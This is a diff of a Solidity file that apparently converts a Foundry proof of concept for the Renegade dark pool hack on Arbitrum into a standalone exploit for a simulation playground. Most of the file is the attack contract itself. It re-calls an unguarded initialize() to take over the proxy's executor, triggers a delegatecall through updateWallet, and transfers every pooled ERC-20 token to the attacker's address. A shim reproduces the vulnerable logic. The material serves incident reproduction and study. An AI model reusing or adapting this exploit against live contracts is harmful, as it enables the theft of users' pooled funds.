@@ -1,77 +1,34 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import {Test} from "forge-std/Test.sol";
-import {console} from "forge-std/console.sol";
 import {IERC20} from "forge-std/interfaces/IERC20.sol";
 
-// @KeyInfo - Total Lost : ~$209K
-// Attacker : https://arbiscan.io/address/0x777253F28AdC29645152b7b41BE5c772A9657777
-// Attack Contract : https://arbiscan.io/address/0x33FB722C76D4e9fC0c86BbF10EBDeA45a4434a34
-// Vulnerable Contract : https://arbiscan.io/address/0x30bD8eAb29181F790D7e495786d4B96d7AfDC518
-// Attack Tx : https://arbiscan.io/tx/0x0e494685ace16d372066c5b4db959b58ebac6d88166c2d9d618e0e421dc0c77e
+// Standalone synthetic exploit for the EVM Playground, mirroring
+// test/Renegade_exp.sol's RenegadeExploitContract + RenegadeStylusInitializeShim
+// 1:1 (same selectors, same storage behaviour, same drain loop). The ONLY
+// difference from the real Foundry PoC is that this file drops the
+// `RenegadeTest is Test` wrapper (forge-std cheatcodes, fork setup, assertions) —
+// the playground's build pipeline handles forking/state-loading/assertions
+// itself. `RenegadeStylusInitializeShim`'s compiled runtime bytecode is
+// installed at the real Stylus implementation address via `codeOverrides` in
+// 2026-05-Renegade.mjs (the playground's equivalent of the real test's
+// `vm.etch(STYLUS_IMPLEMENTATION, ...)`), because the genuine implementation is
+// unexecutable Arbitrum Stylus (Rust/WASM) bytecode that revm cannot run.
 //
-// @Info
-// Vulnerable Contract Code : https://arbiscan.io/address/0x30bD8eAb29181F790D7e495786d4B96d7AfDC518#code
-//
-// @Analysis
-// Post-mortem : https://x.com/renegade_fi/status/2053531772634427599
-// Twitter Guy : https://x.com/DefimonAlerts/status/2053538325969977801
-
-contract RenegadeTest is Test {
-    bytes32 internal constant TX_HASH = 0x0e494685ace16d372066c5b4db959b58ebac6d88166c2d9d618e0e421dc0c77e;
-    address internal constant EXPLOITER = 0x777253F28AdC29645152b7b41BE5c772A9657777;
-    address internal constant EXPLOIT_CONTRACT = 0x33FB722C76D4e9fC0c86BbF10EBDeA45a4434a34;
-    address internal constant DARK_POOL_PROXY = 0x30bD8eAb29181F790D7e495786d4B96d7AfDC518;
-    address internal constant STYLUS_IMPLEMENTATION = 0xC038933d0b33359f5C87B4B2f92Ee0DAd11EaDc5;
-    IERC20 internal constant USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
-
-    function setUp() public {
-        vm.createSelectFork("http://127.0.0.1:8547", 25063493);
-        vm.etch(STYLUS_IMPLEMENTATION, address(new RenegadeStylusInitializeShim()).code);
-        vm.etch(EXPLOIT_CONTRACT, address(new RenegadeExploitContract()).code);
-        vm.label(EXPLOITER, "Exploiter");
-        vm.label(EXPLOIT_CONTRACT, "Renegade Exploit Contract");
-        vm.label(DARK_POOL_PROXY, "Renegade Dark Pool Proxy");
-        vm.label(STYLUS_IMPLEMENTATION, "Renegade Stylus Implementation Shim");
-        vm.label(address(USDC), "USDC");
-    }
-
-    function testExploit() public {
-        uint256 beforeUsdc = USDC.balanceOf(EXPLOITER);
-        uint256[26] memory beforeProxyBalances;
-        uint256[26] memory beforeExploiterBalances;
-
-        for (uint256 i = 0; i < RenegadeTokenList.count(); i++) {
-            address token = RenegadeTokenList.at(i);
-            beforeProxyBalances[i] = IERC20(token).balanceOf(DARK_POOL_PROXY);
-            beforeExploiterBalances[i] = IERC20(token).balanceOf(EXPLOITER);
-        }
-
-        vm.prank(EXPLOITER, EXPLOITER);
-        RenegadeExploitContract(EXPLOIT_CONTRACT).attack();
-
-        uint256 totalStolenUsdE8;
-        for (uint256 i = 0; i < RenegadeTokenList.count(); i++) {
-            address token = RenegadeTokenList.at(i);
-            uint256 stolenAmount = IERC20(token).balanceOf(EXPLOITER) - beforeExploiterBalances[i];
-            assertEq(stolenAmount, beforeProxyBalances[i], "unexpected drained token amount");
-            assertEq(IERC20(token).balanceOf(DARK_POOL_PROXY), 0, "proxy token balance not drained");
-
-            totalStolenUsdE8 += stolenAmount * RenegadeTokenList.usdPriceE8(i) / (10 ** RenegadeTokenList.decimals(i));
-        }
-
-        assertEq(USDC.balanceOf(EXPLOITER) - beforeUsdc, 104_383_594_837);
-        assertGt(totalStolenUsdE8, 200_000e8, "USD value too low");
-        assertLt(totalStolenUsdE8, 220_000e8, "USD value too high");
-        console.log("Total stolen USD", totalStolenUsdE8 / 1e8);
-    }
-}
+// See Renegade_exp.md for the full writeup: the Darkpool proxy's `initialize()`
+// has no one-shot guard, so anyone can re-call it to overwrite the stored
+// "injected logic" / executor address with their own contract. The very next
+// `updateWallet()` call then `delegatecall`s that attacker-controlled address
+// from the proxy's own storage/authority context, letting the attacker's code
+// drain every ERC-20 the Darkpool holds.
 
 contract RenegadeExploitContract {
     address internal constant EXPLOITER = 0x777253F28AdC29645152b7b41BE5c772A9657777;
     IRenegadeDarkPool internal constant DARK_POOL = IRenegadeDarkPool(0x30bD8eAb29181F790D7e495786d4B96d7AfDC518);
 
+    // The single entrypoint recorded by the playground. Mirrors the real
+    // attack tx exactly: re-initialize with our own address as the injected
+    // executor, then trigger updateWallet so the proxy delegatecalls it.
     function attack() external {
         uint256[2] memory publicBlinder;
 
@@ -93,6 +50,9 @@ contract RenegadeExploitContract {
         DARK_POOL.updateWallet("", "", "", "");
     }
 
+    // Reached via delegatecall from the (shimmed) Stylus implementation, in the
+    // Darkpool proxy's own storage context — so address(this) == the proxy and
+    // every balanceOf/transfer below acts on the proxy's pooled assets.
     function drainTokens() external {
         for (uint256 i = 0; i < RenegadeTokenList.count(); i++) {
             address token = RenegadeTokenList.at(i);
@@ -104,23 +64,31 @@ contract RenegadeExploitContract {
     }
 }
 
+// Reproduces the two observable storage operations the real Arbitrum Stylus
+// (Rust/WASM) implementation performed at the attack tx (see Renegade_exp.md
+// "The vulnerable code" section): `initialize` stores the caller-supplied
+// address with NO already-initialized check, and `updateWallet` delegatecalls
+// whatever address is currently stored — with no proof/statement validation
+// first, so the malicious executor is reached immediately.
 contract RenegadeStylusInitializeShim {
     bytes4 internal constant INITIALIZE_SELECTOR = 0x92413afe;
     bytes4 internal constant UPDATE_WALLET_SELECTOR = 0x803f430a;
     address internal injectedLogic;
 
-    // The real implementation is Arbitrum Stylus code; Foundry/revm stops at
-    // OpcodeNotFound there. Only the two selectors reached by the exploit tx are
-    // shimmed: initialize stores attacker-controlled logic in proxy storage, and
-    // updateWallet delegatecalls that logic from the proxy storage context.
     fallback() external {
         require(msg.sig == INITIALIZE_SELECTOR || msg.sig == UPDATE_WALLET_SELECTOR, "unexpected Renegade selector");
 
         if (msg.sig == INITIALIZE_SELECTOR) {
+            // BUG: no "already initialized" guard — slot 0 already held a
+            // legitimate non-zero value from the real deployment, yet this
+            // still overwrites it with whatever address the caller supplies.
             injectedLogic = abi.decode(msg.data[4:], (address));
             return;
         }
 
+        // updateWallet: delegatecall the stored executor with NO proof/
+        // statement validation beforehand. Once `injectedLogic` is the
+        // attacker's contract, this is arbitrary code execution as the proxy.
         address logic = injectedLogic;
         require(logic != address(0), "missing injected logic");
 
@@ -160,7 +128,6 @@ library RenegadeTokenList {
     function count() internal pure returns (uint256) {
         return 26;
     }
-
 
     function decimals(uint256 index) internal pure returns (uint256) {
         if (index == 6) return 8;
